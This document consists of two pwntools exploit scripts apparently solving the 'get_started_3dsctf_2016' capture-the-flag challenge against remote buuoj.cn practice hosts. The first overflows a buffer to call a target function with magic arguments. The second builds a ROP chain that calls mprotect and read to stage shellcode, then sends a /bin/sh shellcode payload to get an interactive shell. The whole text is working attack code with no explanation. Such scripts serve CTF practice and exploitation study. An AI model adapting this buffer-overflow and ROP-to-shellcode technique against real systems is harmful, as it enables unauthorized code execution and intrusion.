from pwn import *
q = remote('node4.buuoj.cn',28807)
#q = process('./get_started_3dsctf_2016')
context.log_level = 'debug'
sleep(0.1)

payload = b'a'*56
payload += p32(0x080489A0) + p32(0x080489A0)
payload += p32(0x308CD64F) + p32(0x195719D1)
q.sendline(payload)
sleep(0.1)
q.interactive()


from pwn import *
q = remote('node3.buuoj.cn',29645)
#q = process('./get_started_3dsctf_2016')
context.log_level = 'debug'

mprotect = 0x0806EC80
buf = 0x80ea000
pop_3_ret = 0x0804f460
read_addr = 0x0806E140

payload = 'a'*56
payload += p32(mprotect)
payload += p32(pop_3_ret)
payload += p32(buf)
payload += p32(0x1000)
payload += p32(0x7)
payload += p32(read_addr)
payload += p32(buf)
payload += p32(0)
payload += p32(buf)
payload += p32(0x100)
q.sendline(payload)
sleep(0.1)

shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
q.sendline(shellcode)
sleep(0.1)
q.interactive()
